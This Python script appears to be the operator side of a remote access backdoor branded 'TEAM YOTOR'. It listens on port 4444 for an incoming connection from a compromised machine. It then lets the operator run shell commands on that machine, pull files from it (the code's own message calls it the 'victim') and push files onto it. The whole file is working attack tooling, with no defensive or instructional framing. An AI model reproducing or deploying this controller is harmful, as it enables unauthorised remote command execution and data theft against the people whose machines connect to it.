import socket
import time

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

logo = f"""
{RED}  __     ______  _______   ____  _____  ____  
  \ \   / / __ \|__   __|/ __ \ |  __ \|  _ \ 
   \ \_/ / |  | |  | |  | |  | || |__) | |_) |
    \   /| |  | |  | |  | |  | ||  _  /|  _ < 
     | | | |__| |  | |  | |__| || | \ \| |_) |
     |_|  \____/   |_|   \____/ |_|  \_\____/ 
{RESET}                 {GREEN}--==[ TEAM YOTOR ]==--{RESET}
"""

print(logo)

host = '0.0.0.0'
port = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)
print(f"{YELLOW}[+] Waiting for connection...{RESET}")
client, addr = server.accept()
print(f"\n{RED}[+] Connected from {addr}{RESET}\n")

while True:
    command = input(f"{GREEN}YOTOR >>> {YELLOW}")
    if not command.strip():
        continue

    if command.lower() == "exit":
        client.send(b"exit ")
        break

    elif command.startswith("download "):
        client.send(command.encode())
        filename = command[9:]
        with open(f"received_{filename}", "wb") as f:
            while True:
                data = client.recv(4096)
                if b"__DONE__" in data:
                    f.write(data.replace(b"__DONE__", b""))
                    break
                elif b"__FILE_NOT_FOUND__" in data:
                    print(f"\n{RED}[!] File not found on victim.{RESET}")
                    break
                f.write(data)
        print(f"\n[+] File '{filename}' downloaded.")

    elif command.startswith("upload "):
        try:
            client.send(command.encode())
            filename = command[7:]
            with open(filename, "rb") as f:
                data = f.read(4096)
                while data:
                    client.send(data)
                    data = f.read(4096)
                time.sleep(1)
                client.send(b"__DONE__")
            print(f"\n[+] File '{filename}' uploaded.")
        except FileNotFoundError:
            print(f"\n{RED}[!] File not found on your system.{RESET}")

    else:
        client.send(command.encode())
        result = client.recv(4096).decode()
        print(f"\n{RED}{result}{RESET}")

client.close()


